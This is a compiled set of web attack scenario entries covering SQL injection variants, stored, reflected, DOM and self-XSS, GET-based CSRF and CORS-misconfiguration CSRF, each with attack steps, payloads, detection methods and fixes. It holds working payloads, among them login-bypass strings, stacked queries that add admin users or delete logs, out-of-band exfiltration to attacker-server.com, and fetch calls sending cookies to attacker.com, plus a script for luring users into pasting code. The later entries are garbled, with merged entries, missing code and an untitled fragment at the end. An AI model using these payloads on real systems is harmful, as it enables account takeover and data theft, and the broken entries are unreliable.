Title: Authentication Bypass via SQL Injection
Scenario Description: A login form fails to validate or sanitize input, allowing attackers to log in as admin without knowing the password.
Attack Steps: 1. Reconnaissance: Find a login form on the website (e.g., username and password fields). 2. Test for Injection: Enter a simple payload like ' OR '1'='1 in the username or password field. 3. Analyze Response: If the login succeeds or error message changes, it may be vulnerable. 4. Craft Exploit: Use payloads like: Username: ' OR '1'='1' --  Password: anything. 5. Bypass Authentication: The SQL query behind the scenes becomes: SELECT * FROM users WHERE username='' OR '1'='1' -- ' AND password='anything'. This always returns true (1=1), tricking the system to log in without a password.. 6. Access Granted: Attacker gets access to admin or user accounts.
Target Type: Web Login Portals (e.g., banking, admin dashboards, e-commerce)
Vulnerability: Unsanitized input fields in SQL queries
Impact: Full account takeover, data theft, privilege escalation
Detection Method: Web server logs, anomaly detection (e.g., logins without passwords), WAF alerts
Solution: Use prepared statements, Sanitize inputs, Limit login attempts, Use CAPTCHA, Enable MFA
Tags: SQLi, Authentication Bypass, Web Security, OWASP Top 10

Title: Union-Based SQL Injection
Scenario Description: This attack occurs when a hacker uses the SQL "UNION" operator to combine results from a malicious query with a legitimate one, often gaining access to hidden data from the database through a vulnerable web application.
Tools Used: SQLMap, Burp Suite, Havij, Browser Developer Tools
Attack Steps: 1. Identify User Input Points: Attacker finds a search bar, login form, or URL that interacts with the database. 2. Test for Vulnerability: Attacker inputs a single quote ' to break the query. If error messages or unusual behavior occur, it may be vulnerable. 3. Use UNION Operator: Attacker tries to use UNION SELECT to combine their own query with the original one. This reveals additional columns/data. 4. Find Number of Columns: Attacker uses tricks like ORDER BY or trial-and-error UNION SELECT NULL,NULL,... to match the column count of the original query. 5. Extract Data: Once matched, attacker replaces NULL values with username, password, or email columns to steal data. 6. Bypass and Automate: Tools like SQLMap automate this entire process, pulling sensitive data quickly.
Target Type: Web Applications, Login Pages, Search Forms
Vulnerability: Improperly filtered input fields that allow SQL queries to be altered
Impact: Data leakage, Credential theft, Account takeover, Unauthorized database access
Detection Method: Web Application Firewalls (WAF)Log AnalysisInput Sanitization LogsSQL Error Monitoring
Solution: Use parameterized queries (Prepared Statements)Sanitize all user inputsDisable detailed SQL error messagesApply least privilege to database accountsRegularly update and patch software
Source: OWASP, MITRE ATT&CK, Acunetix, PortSwigger Web Security Academy

Title: Error-Based SQL Injection
Scenario Description: This attack occurs when an attacker intentionally triggers database errors to extract information. These errors often reveal hidden data or database structure, helping attackers steal credentials or plan further attacks.
Tools Used: SQLMap, Burp Suite, Manual Browser Testing, Havij
Attack Steps: 1. Identify Input Points:Attacker finds a field like login, search, or URL parameter that interacts with a database.2. Send a Malformed Query:Attacker enters incorrect or unexpected input such as ' or ") that may cause the SQL query to fail.3. Observe Error Messages:If the application displays database error messages, it can leak details like table names, database type, or version.4. Craft Error-Based Payloads:Attacker uses payloads like ' AND 1=CONVERT(int, (SELECT TOP 1 name FROM sys.tables))-- to force errors that leak internal data through the error itself.5. Extract Data via Errors:By forcing different types of errors, the attacker can learn about:Table namesColumn namesDatabase versionSensitive values (like usernames)6. Automate the Attack:Tools like SQLMap make it easy to automatically test and exploit error-based injection vulnerabilities and extract data from error messages.
Target Type: Web Applications, Login Forms, URL Parameters, Admin Panels
Vulnerability: Error message exposure due to lack of input validation and improper database handling
Impact: Information disclosure, Database structure exposure, Entry point for further attacks, Sensitive data leakage
Detection Method: Review and monitor error logsEnable generic error pagesMonitor for unusual user inputsUse WAF to detect SQL errors
Solution: Turn off detailed error messages in productionUse parameterized queriesInput validation and sanitizationRegular vulnerability scanningLeast privilege database access
Source: OWASP, MITRE ATT&CK, Acunetix, PortSwigger Web Security Academy

Title: Blind SQL Injection
Scenario Description: In Blind SQL Injection, the attacker doesn’t see error messages or data output directly, but can still extract data by sending specific questions to the database and observing the application’s behavior (like page load times or content changes).
Tools Used: SQLMap, Burp Suite, sqlninja, Manual Browser Testing, Python Scripts
Attack Steps: 1. Find a User Input Point:Attacker finds a place where user input is passed to the database, such as a login form, URL parameter, or search box.2. Test for Blind Injection:The attacker tries a basic test like ' OR 1=1-- to see if the app behaves differently (e.g., redirects, slow loading, or page content change). If there’s no error or visible output, it could be vulnerable to Blind SQL Injection.3. Use True/False Logic:Attacker sends queries like:' AND 1=1-- → (Always true)' AND 1=2-- → (Always false)They observe how the application behaves differently based on the truth of the condition. This confirms vulnerability.4. Extract Data Bit-by-Bit:Since no data is shown, attacker asks yes/no questions to retrieve data. For example:' AND SUBSTRING(@@version,1,1)='5'--By changing the character or position, the attacker can slowly build the version string or any other info.5. Use Time-Based Blind SQL (if no content changes):If no difference in content is visible, the attacker can inject a time delay, like:' IF(1=1, SLEEP(5), 0)--If the page delays, it means the condition was true. This is called Time-Based Blind SQLi.6. Automate with Tools:SQLMap can automatically perform blind SQLi, sending hundreds of such queries to extract database names, tables, and data.
Target Type: Web Applications, Login Pages, Search Fields, Query Parameters
Vulnerability: No error messages, but user input is still passed to the database and not properly sanitized
Impact: Slow and stealthy data theftFull database compromise over timeCredential and sensitive info leakage
Detection Method: Monitor for slow and repetitive requestsAnalyze behavioral anomalies in logsUse IDS/IPS and WAF to detect patterns
Solution: Use parameterized queries (prepared statements)Sanitize and validate all inputHide system errors from usersRate limit and monitor repeated requestsRegular vulnerability scanning
Source: OWASP, MITRE ATT&CK, Acunetix, PortSwigger, SQLMap Docs

Title: Second-Order SQL Injection
Scenario Description: In a Second-Order SQL Injection, the attacker injects malicious code into a system where it's stored safely at first, but becomes dangerous later when the system uses that data in a different context (like another query). It’s harder to detect because the effect happens in a later step, not immediately.
Tools Used: Burp Suite, SQLMap, Postman, Browser Dev Tools, Manual Testing
Attack Steps: 1. Identify Stored Input Fields:The attacker looks for forms where input is stored in the database, such as user registration, profile update, or contact forms.2. Inject Malicious Input:Instead of trying to break the query immediately, the attacker submits input like:' OR '1'='1 into a field such as "last name" or "address". This gets stored in the database without triggering an error.3. Wait for Later Execution:The malicious input is harmless at first, but later, when another part of the application uses that value in an SQL query without re-sanitizing it, the injection is triggered.4. Exploit Execution Point:For example, when the user logs in or views their profile, the stored input might be used in a dynamic SQL query like:SELECT * FROM users WHERE last_name = '<stored_value>'This is where the injection gets executed.5. Extract or Modify Data:If the query is successfully injected, the attacker can extract sensitive data or modify the behavior of the application (e.g., logging in as another user).6. Automate or Chain Attacks:With scripting or tools, attackers may automate this process and chain it with other attacks like privilege escalation.
Target Type: Web Applications, User Registration Forms, Profile Update Features
Vulnerability: Trusting previously stored unvalidated data in SQL queries
Impact: Delayed data theftUnexpected system behaviorSession hijackingAdmin access through logic manipulation
Detection Method: Log monitoring for delayed query failuresTrack use of stored user input in queriesUse behavior analytics to detect unusual patterns
Solution: Sanitize and validate inputs both at entry and at executionUse prepared statements for all dynamic queriesEscape stored user data before reusePerform code reviews for indirect query execution
Source: OWASP, MITRE ATT&CK, PortSwigger Academy, Acunetix

Title: Out-of-Band SQL Injection
Scenario Description: Out-of-Band SQL Injection occurs when the attacker can’t directly see the response of their attack (like with Blind SQLi), but can receive data through a different channel—like DNS or HTTP requests—sent from the database server to an attacker-controlled server. It’s especially useful when traditional in-band (direct) methods don't work.
Tools Used: SQLMap, Burp Collaborator, DNSlog.cn, RequestBin, Custom DNS Servers, Netcat
Attack Steps: 1. Identify Input Points:The attacker finds input fields or URLs that may be passed to a backend database, such as email forms, search bars, or login fields.2. Inject a Payload That Sends a Request Out:Instead of asking for visible results, the attacker sends a query that causes the database to connect to an external server. For example:'; EXEC xp_dirtree '\\attacker-server.com\abc'-- (for MS SQL)or'; SELECT load_file('\\\\attacker-server.com\\abc')-- (for MySQL)3. Wait for a Callback (OOB Communication):The database tries to execute the injected code, causing it to send a DNS or HTTP request to the attacker’s server. This confirms that the injection worked and may include leaked data.4. Extract Data Remotely:Advanced payloads can exfiltrate usernames, passwords, or other data as part of the DNS request, e.g.,' UNION SELECT host_name() INTO OUTFILE '\\attacker.com\${data}'--5. Automate With Tools:Tools like SQLMap with --dns-domain or Burp Collaborator automate detection and exfiltration by setting up listener servers and catching outbound requests.6. Use in Restricted Environments:OOB SQLi is especially useful when error messages and responses are blocked, but outbound requests are allowed (e.g., cloud-hosted or segmented systems).
Target Type: Web Applications with Database Backends (SQL Server, Oracle, MySQL), Cloud APIs
Vulnerability: Improperly handled input and enabled database functions that allow external resource access
Impact: Stealthy data exfiltrationFull remote database compromiseHard-to-detect attack paths
Detection Method: Monitor outbound DNS/HTTP trafficInspect logs for abnormal external lookupsUse intrusion detection systems (IDS)
Solution: Disable database network access for external domainsUse parameterized queriesFilter and sanitize all user inputDisable dangerous SQL functions (like xp_cmdshell, load_file, etc.)
Source: OWASP, MITRE ATT&CK, Acunetix, PortSwigger, SQLMap Docs

Title: Boolean-Based Blind SQL Injection
Scenario Description: Boolean-Based Blind SQLi is a type of blind injection where the attacker sends queries that result in true or false responses, and observes how the application behaves. The attacker doesn’t see the data directly, but infers it from changes in page content, status, or redirection.
Tools Used: SQLMap, Burp Suite, Python Scripts, Custom HTTP Tools
Attack Steps: 1. Find an Input Point:Attacker finds a user input field (login, search, URL param) that interacts with the backend database.2. Test for SQL Injection Using Boolean Logic:Attacker injects simple payloads:' AND 1=1-- (TRUE)' AND 1=2-- (FALSE)They observe how the web page behaves. If the content changes, it's a strong sign of Boolean-Based SQLi.3. Determine Conditional Behavior:By carefully crafting queries, attackers can ask yes/no questions to extract information, e.g.,' AND SUBSTRING((SELECT database()), 1, 1) = 'a'--If the page loads normally, the condition is true (first letter of DB name is ‘a’); if not, it's false.4. Extract Information Bit-by-Bit:By changing the character positions and testing different letters, the attacker builds information such as:Database nameTable namesColumn namesUsernames/passwords5. Automate the Process:Since it’s slow and manual, tools like SQLMap can automate this bit-by-bit extraction based on page responses.6. Maintain Stealth:This method doesn’t generate errors or unusual output, making it hard to detect through simple monitoring.
Target Type: Web Applications, Login Pages, Search Bars, URL Parameters
Vulnerability: Lack of input validation and reliance on SQL logic in user input
Impact: Stealthy data theftUnauthorized data accessPotential system compromise
Detection Method: Track repeated logical queriesUse WAF to detect Boolean payloadsCompare request patterns
Solution: Use parameterized queriesSanitize and validate all user inputsDisable detailed debug behaviorApply least privilege access
Source: OWASP, MITRE ATT&CK, Acunetix, PortSwigger Web Security Academy

Title: Stored SQL Injection
Scenario Description: In Stored SQL Injection, the attacker injects malicious SQL code into an input that is saved/stored in the database. Later, when the system retrieves and uses that data in a new SQL query without proper sanitization, the malicious code is executed. This makes it more dangerous than basic SQLi, as it can affect many users and run repeatedly.
Tools Used: SQLMap, Burp Suite, Manual Testing, Postman, Browser Developer Tools
Attack Steps: 1. Identify a Storable Input Field:Attacker looks for fields that save user input to the database, such as:- Comments- User profiles- Contact forms- Registration details2. Inject Malicious SQL Code:Attacker submits SQL payloads into the form, such as:Robert'); DROP TABLE users;-- or ' OR 1=1--These inputs get stored in the database without triggering an error immediately.3. Wait for a Trigger Event:Later, another user or the system itself retrieves the stored data, and inserts it into a new query without validating it again.4. Execution of Stored Payload:When the stored input is executed in the backend SQL query, it may:- Drop a table- Modify data- Return unauthorized user data- Log in as admin5. Spread or Escalate the Attack:The stored payload may affect multiple users or admin functions whenever that data is fetched, causing broader damage.6. Automate or Chain Attacks:Attackers can use scripts or tools to inject multiple payloads across many fields and track when they're triggered.
Target Type: Web Applications with user-generated content (forums, blogs, profile systems)
Vulnerability: Inputs stored in database without sanitization and later reused in queries
Impact: Database corruption or deletionMass compromise of user dataAdmin takeoverRepeated execution on each view
Detection Method: Monitor logs for repetitive query patternsUse tools to test form fields and storage layersWatch for database changes linked to user input
Solution: Sanitize user inputs at both entry and retrievalUse prepared statements with parametersDo not concatenate stored user data into SQL queriesRegularly audit user input fields and backend query logic
Source: OWASP, MITRE ATT&CK, PortSwigger Web Security Academy, Acunetix

Title: Login Bypass via SQL Injection
Scenario Description: This attack allows a hacker to log in without knowing the username or password by injecting SQL commands into the login form. The attacker manipulates the login SQL query to always return “true,” which tricks the system into thinking the login is valid.
Tools Used: Burp Suite, SQLMap, Browser Dev Tools, Postman, Custom Scripts, Manual Input
Attack Steps: 1. Locate a Login Form:The attacker finds a page where users log in, usually asking for a username and password.2. Understand Normal Behavior:Normally, when a user enters credentials, the website sends a SQL query like:SELECT * FROM users WHERE username = 'input' AND password = 'input';3. Craft a Malicious Input:The attacker inserts special characters to break the query and modify its logic.For example, they enter:- Username: ' OR '1'='1- Password: anything or leave it blankThis makes the SQL query look like:SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '';Since '1'='1' is always true, the query returns a valid user.4. Login is Bypassed:Instead of checking for a real user/password combo, the system sees “true” and logs the attacker in as the first user in the database—often an admin!5. Variants for Different Scenarios:The attacker may try different payloads depending on how the form is built:- ' OR 1=1-- (to comment out rest of the query)- ' OR 'x'='x'--- ' UNION SELECT NULL, NULL-- (in more advanced cases)6. Test with Tools (Optional):Tools like Burp Suite or SQLMap can help automate the injection, intercept requests, and test many payloads quickly.7. Escalate Privileges (if successful):If the login bypass gives access to an admin account, the attacker can change passwords, steal data, or deface the site.
Target Type: Login Forms of Web Applications (Admin Panels, CMS, E-commerce, Forums)
Vulnerability: Login fields that include unsanitized user input directly into SQL queries
Impact: Unauthorized loginAdmin account takeoverData theft and manipulationComplete control of the application
Detection Method: Monitor logs for unusual login patternsCheck for login attempts using SQL keywords like ', OR, --Use Web Application Firewalls (WAFs)Enable alerting for failed login flood
Solution: Use prepared statements to safely handle user inputSanitize and validate inputs (e.g., no special characters)Limit login attempts and add CAPTCHAHide detailed SQL errors from usersRegular security testing and code review
Source: OWASP, MITRE ATT&CK, PortSwigger Web Security Academy, Acunetix, SQLMap Docs

Title: Stacked SQL Injection
Scenario Description: Attacker uses SQL injection with stacked queries (i.e., multiple SQL statements separated by a semicolon) to perform multiple actions on the database, such as bypassing login, modifying tables, or creating new users. This is especially dangerous when the DBMS allows execution of multiple queries in one request.
Attack Steps: 1 Reconnaissance: The attacker first identifies a vulnerable input point — for example, a login form or URL parameter — where SQL queries are processed by the backend. 2. Initial Payload Test:        The attacker inputs a basic test payload like ' OR '1'='1 to see if the app is vulnerable. If successful, it indicates SQL injection. 3. Stacked Query Testing:        To test if stacked queries are allowed, the attacker tries a payload like: '; SELECT version();-- or '; DROP TABLE users;--. If the application does not sanitize the input or uses string concatenation directly in queries, the payload may execute multiple statements. 4. Login Bypass Example:        Injected payload: ' OR 1=1;-- into the username field, and any dummy password. This bypasses login if SQL is not sanitized. 5. Modify Database: If stacked queries are allowed, the attacker can execute something like: ' ; UPDATE users SET is_admin=1 WHERE username='attacker';-- to escalate privileges. 6. Add New Admin User:         Payload: '; INSERT INTO users (username, password, is_admin) VALUES ('evil', '123', 1);-- creates a new admin user directly via the injection point. 7. Extract Data: The attacker can also stack SELECT statements: '; SELECT credit_card_number FROM customers;-- to dump sensitive data. 8. Use Automation Tools (Optional):        Tools like SQLMap automate detection and exploitation of stacked queries. It can confirm DBMS, dump databases, create users, etc. 9. Cover Tracks:        A skilled attacker may delete logs using queries like: '; DELETE FROM logs;-- or similar to avoid detection.10. Maintain Access:      Create persistent access via database triggers or backdoor accounts created through injection.
Target Type: Web Applications (Login Forms, Search, Admin Panels)
Vulnerability: Improper Input Validation, No Query Parameterization
MITRE Technique: T1505 (Exploitation for Privilege Escalation), T1190 (Exploit Public-Facing Application)
Impact: Full DB compromise, account takeover, command execution
Detection Method: WAF logs, SQL query anomalies, server-side logging, IDS/IPS alerts
Solution: Use parameterized queries (prepared statements), strict input validation, disable stacked queries if DB allows, WAF rules
Tags: sqli, stacked queries, multiple statements, auth bypass, db manipulation

Title: Comment Injection in SQL
Scenario Description: In this attack, an attacker uses SQL comment syntax (--, #, or /* */) to manipulate or terminate part of a query. This is often used to bypass authentication or disable security checks in the SQL logic.
Tools Used: Burp Suite, SQLMap, Web browser (manual testing)
Attack Steps: 1. Identify User Input Field – The attacker finds a user input (like login or search) that seems to interact with a SQL database.2. Inject SQL Comment Characters – The attacker tries payloads like ' --, ' #, or ' /* to observe if the application is terminating or ignoring part of the SQL query.3. Bypass Login Logic – Injecting ' OR 1=1 -- into a username field might turn a query like SELECT * FROM users WHERE username = '' OR 1=1 --' AND password = '' which bypasses authentication.4. Disable Query Conditions – Using comment syntax to skip over password checks or role checks, for example: ' OR 'a'='a' --.5. Confirm and Automate – Once a successful injection is confirmed, the attacker may automate the process using tools like SQLMap to extract further data.6. Attempt Further Exploits – If the comment injection works, attacker may try UNION-based, stacked, or time-based SQLi for data extraction.
Target Type: Web Applications (Login Forms, Search Bars, Admin Panels)
Vulnerability: Input not properly sanitized or parameterized; uses dynamic SQL concatenation
Impact: Unauthorized access, login bypass, data theft
Detection Method: Log unusual SQL patterns (e.g., queries ending in --), failed login logs, WAF alerts
Solution: Use parameterized/prepared SQL queries, input validation, WAF rules to block --, #, /*, etc., and avoid string concatenation in queries

Title: Stored XSS (Persistent XSS)
Scenario Description: Stored XSS is when an attacker submits malicious code (usually JavaScript) into a website input form (like a comment or message), and that code is saved in the database. Later, when another user views that page, the malicious code runs in their browser without their knowledge. It can steal data, hijack sessions, or redirect users silently.
Tools Used: Burp Suite, OWASP ZAP, Browser Dev Tools, BeEF Framework, Manual Testing
Attack Steps: 1. Find a Storable Input Field (Like Comment Box):The attacker looks for a form that stores user input in a database and displays it on a webpage. Common targets include:Blog commentsUser bios/profilesProduct reviewsChat messages2. Inject Malicious Script:Instead of writing a normal message, the attacker submits JavaScript code, like:<script>alert('Hacked!');</script>This code is saved in the website’s database.3. Wait for the Code to be Triggered:Whenever another user (or even an admin) visits the page where the data is shown, the browser executes the malicious script automatically.4. Perform Malicious Action (Steal Cookies, Redirect, Control User):The attacker can:Show fake login formsSteal session cookies: document.cookieRedirect users to malicious sitesControl the browser using tools like BeEFFor example, a payload like this:<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>would send your login cookie to the attacker’s server.5. No Interaction Required (Dangerous):Unlike other attacks, the victim doesn’t need to click anything—just viewing the page triggers the attack.6. Chain with Other Attacks:Stored XSS is often used to gain admin access, hijack sessions, or escalate to account takeover, especially if used in combination with session cookie theft or CSRF.7. Use Tools to Test & Automate:Security testers use Burp Suite, OWASP ZAP, or browser developer tools to find and test stored XSS. Ethical hackers simulate these attacks safely to test website defenses.
Target Type: Web Applications with comment boxes, forums, chat apps, review forms
Vulnerability: User input that is stored in the backend and shown on webpages without proper sanitization or encoding
Impact: User session hijackingPhishing without redirectMalware delivery via browserAdmin account compromise
Detection Method: Scan forms and inputs for script injectionCheck HTML source for unescaped dataUse automated tools like OWASP ZAP, Burp Scanner
Solution: Sanitize and escape output (encode user input before displaying it)Use Content Security Policy (CSP)Use modern frameworks that auto-escape outputs (like React, Angular)Input validation and output encoding are a mustDisable inline scripts with HTTP headers
Source: OWASP, PortSwigger Web Security Academy, Acunetix, Mozilla Developer Network, MITRE ATT&CK

Title: Reflected XSS
Scenario Description: In a reflected XSS attack, the malicious script is reflected off a web server — for example, in a search result or error message. The script is embedded in a URL, which the attacker tricks the victim into clicking. When the victim clicks the link, the script runs in their browser, but it is not stored permanently on the website.
Tools Used: Browser Developer Tools (F12), Burp Suite (for intercepting and modifying requests), OWASP ZAP, Custom malicious URL with JavaScript payload (e.g., <script>alert(1)</script>)
Attack Steps: Step 1: Find a Vulnerable Input: Look for search boxes, feedback forms, contact pages, URL parameters like ?q=searchTerm. Example URL: https://example.com/search?q=hello. Step 2: Test Input Reflection: Type a random string like test123 in the input and submit. If it appears on the next page (like You searched for test123), then the input is reflected. That’s your first clue. Step 3: Inject Basic Script: Now try something simple: https://example.com/search?q=<script>alert("XSS")</script>, If an alert pops up — Boom 💥 — it’s vulnerable to Reflected XSS.Step 4: Craft a Malicious Link: Use social engineering to make the link look legitimate. Example:https://example.com/search?q=<script>document.cookie</script>This can steal cookies. Step 5: Send the Link to Victim: The attacker sends this crafted link to the victim via email, chat, comments, etc. Step 6: Victim Clicks the Link: As soon as the victim clicks, the browser executes the script (because it thinks it’s legit). Step 7: Script Executes in Victim’s Browser: The attacker can now steal data, redirect the user, show fake login forms, or perform any browser-based action.
Target Type: Web Application with user-controlled input that reflects user data in HTML response without proper sanitization.
Vulnerability: Lack of input validation and output encoding (e.g., reflecting user input in raw HTML without escaping characters like < > " ')
MITRE Technique: T1059.007 – Command and Scripting Interpreter: JavaScript, T1189 – Drive-by Compromise
Impact: Session Hijacking (stealing user cookies), Redirecting to fake websites (phishing), Fake login forms (credential stealing), Keylogging (capture keystrokes), Running unwanted JavaScript (browser abuse)
Detection Method: Monitor logs for suspicious URLs with <script> or JavaScript tags,  Use automated scanners (e.g., OWASP ZAP, Burp Suite),Check for alert popups or unwanted redirects, Look for unusual user behavior triggered by links
Solution: Always sanitize user input: Use output encoding (e.g., escape < > ' "),Use modern frameworks with XSS protection, Apply Content Security Policy (CSP), Don’t reflect user input in raw HTML, Validate and whitelist input content
Tags: Reflected XSS, Non-Persistent, JavaScript Injection, Browser Exploit, Web Security
Source: Educational Example based on OWASP Top 10 and MITRE ATT&CK framework

Title: DOM-Based XSS (Document Object Model XSS)
Scenario Description: DOM-Based XSS occurs when the browser executes JavaScript based on URL data or user input without properly sanitizing it. The attacker crafts a malicious link containing JavaScript code, and when a victim opens the link, their browser executes that script without any server involvement.
Tools Used: Burp Suite, Chrome DevTools, OWASP ZAP, DOM Invader (Burp Extension), XSS Hunter
Attack Steps: 1. Understand How DOM-Based XSS Works:DOM stands for Document Object Model, which is the browser’s way of understanding and modifying a webpage. DOM XSS happens entirely in the browser, not on the server.2. Find a Vulnerable Page:Attacker looks for a web page that uses JavaScript to read the URL, and then updates the page without escaping the value.Example URL:https://example.com/page.html#name=JohnAnd inside the page, the JavaScript code might do this:document.write(location.hash);This will directly write the content from the URL into the page, which is dangerous.3. Craft a Malicious URL:Attacker changes the URL fragment (like #name=John) to JavaScript code:https://example.com/page.html#name=<script>alert('Hacked!')</script>4. Send the Link to the Victim:The attacker tricks the user into clicking this malicious link through:EmailChat messageSocial mediaQR code5. Victim Opens the Page in Their Browser:The vulnerable page reads the malicious part of the URL (called a “payload”) and injects it into the page without escaping it.6. Code Executes Silently:The victim sees a normal page, but in the background, the attacker’s JavaScript has run. It might:Steal cookies (document.cookie)Redirect to a phishing siteModify page content (fake forms, buttons)Load malware or spy tools7. Attack is Invisible to Server:This entire attack happens inside the browser. The server never sees the malicious script, making detection more difficult.8. Use Tools to Find DOM XSS:Ethical hackers and pentesters use:Burp Suite + DOM InvaderOWASP ZAPManual testing using Chrome DevTools
Target Type: Single Page Applications (SPAs), JavaScript-heavy websites, search pages, dashboards, URL-based filters
Vulnerability: Client-side JavaScript that uses location, document, or URL input without sanitizing it
Impact: User data theft (cookies, tokens)Phishing and fake login formsBrowser hijackingComplete session takeover
Detection Method: Use browser security tools like DOM InvaderCheck JavaScript files that access location, document.URL, etc.Perform dynamic analysis (run app and test inputs in real time)
Solution: Always sanitize data before inserting into the DOMUse textContent instead of innerHTMLUse JavaScript frameworks (React, Angular) which auto-sanitizeAvoid writing raw user input directly into HTMLUse Content Security Policy (CSP) to block inline scripts
Source: OWASP, PortSwigger Web Security Academy, DOM Invader (Burp), Acunetix, Mozilla Web Docs

Title: Self-XSS (Self Cross-Site Scripting)
Scenario Description: Self-XSS is not a technical vulnerability in the website but a social engineering attack where the attacker tricks the user (often a non-technical person) into pasting and running malicious JavaScript code in their browser’s developer console. This lets the attacker steal the victim’s data.
Tools Used: Browser Developer Console (F12), Chat Apps, Social Media, Pastebin, Clipboard
Attack Steps:
Step 1: Understand Self-XSS- This is not a problem with the website’s code, but with the user’s behavior.- The attacker fools a user into running dangerous code in their browser. Step 2: Attacker Creates Malicious JavaScript Code- Example:javascript
fetch("https://attacker.com/steal?cookie=" + document.cookie)
- This code will steal your login cookie and send it to the attacker. Step 3: Attacker Crafts a Fake Message- The attacker posts a tempting or fake help message like: - “Want free game credits? Paste this into your console!” - “Fix the website error by copying this code!”. Step 4: Victim Sees This Message- On forums, gaming sites, Discord, Telegram, YouTube comments, or social media.- They may see a link to Pastebin with “important instructions”. Step 5: Victim Opens Browser Console- They press F12 or Ctrl+Shift+I to open Developer Tools.- Then go to the Console tab. Step 6: Victim Pastes the Malicious Code- Thinking it’s harmless or helpful.- They copy and paste the JavaScript code and press Enter. Step 7: Code Executes in Authenticated Session- The code runs as if the user typed it themselves.- Because they’re logged in, the code can: - Steal cookies (document.cookie) - Send tokens/session IDs to attacker - Change account settings - Send spam messages. Step 8: Attacker Gets the Stolen Data- The attacker sees the cookie/token on their own server.- Now they can login as the victim or take over the account. Title: GET-Based CSRF (Cross-Site Request Forgery)
Scenario Description: GET-Based CSRF is a type of attack where an attacker tricks a logged-in user into clicking a link or loading an image that makes a GET request to a trusted web application. Since the user is already authenticated, the server treats the forged request as legitimate — causing unauthorized actions like account updates, money transfers, or logouts.
Tools Used: Burp Suite, OWASP ZAP, CSRF POC Generator, Browser DevTools
Attack Steps:
Step 1: Understand How Authentication Works- When you're logged into a site, it stores a session (usually in a cookie).- When you visit any page or make a request, the cookie is automatically sent with it. Step 2: Learn What CSRF Is- CSRF means “Cross-Site Request Forgery”.- It tricks your browser into making a request you didn’t intend — but the site thinks it’s coming from you because you’re already logged in. Step 3: Understand GET vs POST- GET requests are made when you visit a URL like:https://bank.com/transfer?to=attacker&amount=1000- If that endpoint performs an action without checking who initiated it, it can be exploited. Step 4: Attacker Creates a Malicious URL- The attacker crafts a GET link like:https://victimbank.com/transfer?to=hacker&amount=1000. Step 5: Deliver the Payload- The attacker tricks the user into clicking a link or visiting a page that automatically loads the URL.- This can be hidden in:ImagesHTML linksEmailsAdsExample:html

. Step 6: Victim is Logged In- The user has a valid session cookie with victimbank.com- When the image is loaded, the browser sends a GET request with the session cookie — automatically. Step 7: Server Executes Action- If the site doesn’t check for CSRF tokens, it believes this is a real user action.- Money is transferred or profile changed without the user knowing. Step 8: Real-World ExamplesChanging a user’s email addressResetting a passwordSending messages on behalf of a userDeleting an accountBuying items. Step 9: Why GET-Based CSRF is Dangerous- GET requests can be embedded easily in: - Images - Hidden frames - Redirect links- No JavaScript needed. Step 10: Victim Has No Idea- Everything happens in the background- The page may never reload- The attacker can perform repeated actions if not protected
Target Type: Websites that perform state-changing actions through GET requests
Vulnerability: No CSRF token in GET requests; trusting session cookies alone
Impact: - Unauthorized money transfers- Password/email changes- Full account compromise- Privacy violations- Data manipulation
Detection Method: - Check for endpoints that perform sensitive actions using only GET- Use security scanners for CSRF- Monitor logs for repeated GET actions from different origins- Perform manual testing with cookies and CSRF test cases
Solution: - Do not use GET for state-changing operations (use POST/PUT)- Implement CSRF tokens in all sensitive actions- Use SameSite=Lax or Strict for cookies- Validate the request’s origin or referrer- Educate developers to avoid using GET for actions like delete/update or transfer money
Source: OWASP CSRF Guide, PortSwigger Academy, Mozilla Web Docs, WebAppSec Cheat Sheets

Title: CSRF via XMLHttpRequest (Using CORS Misconfig)
Scenario Description: This advanced CSRF attack takes place when a website allows cross-origin JavaScript requests (CORS) without validating the origin properly. An attacker’s JavaScript from a malicious website can use XMLHttpRequest or fetch() to send unauthorized POST/GET requests to a target website (where the victim is logged in) and read the response, leading to account hijack or sensitive data exposure.

Attack Steps:
Step 1: Understand CORS Basics- CORS (Cross-Origin Resource Sharing) is a browser mechanism that controls whether JavaScript from one domain (attacker.com) can make requests to another domain (victim.com).- It relies on Access-Control-Allow-Origin and cookies. Step 2: Identify Misconfigured Target Website- Target website sets a wildcard origin * or reflects attacker-controlled origin (Origin: attacker.com) in the response header:Access-Control-Allow-Origin: * or Access-Control-Allow-Origin: attacker.com- And it also sets:Access-Control-Allow-Credentials: true- This means the site allows cross-origin requests with cookies, including session tokens. body: JSON.stringify({ password: "hacked123" }). Step 4: Victim is Logged In to victim.com- The victim has an active session with victim.com. Step 5: Victim Visits Attacker’s Page- Victim visits evil.com, the script runs automatically. Step 6: Browser Sends Cookies Silently- Because CORS allows credentials: include, the victim’s cookies (session ID) go along with the request. Step 7: Server Accepts Request- If the server doesn’t check CSRF tokens or referrer/origin headers, it processes the request as if the user made it. Step 8: Data is Changed or Leaked- Password, email, settings are changed, or attacker reads private info via response body. Step 9: Real Attack TargetsREST APIsAJAX-based dashboardsReact/Vue/Angular SPAsAdmin panels. Detection Method: - Use Burp Suite/ZAP to scan CORS settings- Manually inspect response headers:Access-Control-Allow-Origin, Access-Control-Allow-Credentials- Test with evil.com and check if response is accessible
Solution: - Never set Access-Control-Allow-Origin: * with credentials: true- Always whitelist trusted domains only- Require CSRF tokens on all state-changing endpoints- Use SameSite=Strict cookies- Don’t allow cookies to be sent on cross-origin requests unless necessary

Tools Used: Browser, Android Emulator, Burp Suite, Postman, JavaScript, Local Web Server
Attack Steps:
Step 1: Understand Hybrid or SPA Apps- Apps built using React, Angular, or hybrid tools like Ionic or Cordova are often SPAs.- They communicate with a server using APIs like:POST /api/update-profile or POST /api/change-password- These APIs use cookies or bearer tokens for session authentication.- Often there’s no CSRF token, because devs assume “It’s not a browser.” Step 2: Identify Session Use- Open the app on your phone or emulator.- Log into your test user account.- Use Burp Suite or any proxy tool to intercept API calls.- Look for cookies like sessionid=xyz123 sent automatically. Step 3: Check for Missing CSRF Token- Modify one intercepted POST request (like changing password or email).- Remove the CSRF token (if any).- If the server still accepts it → vulnerable. Step 4: Build a Fake Web Page (attacker site)- Create a simple HTML file hosted on a local web server or on the internet:html

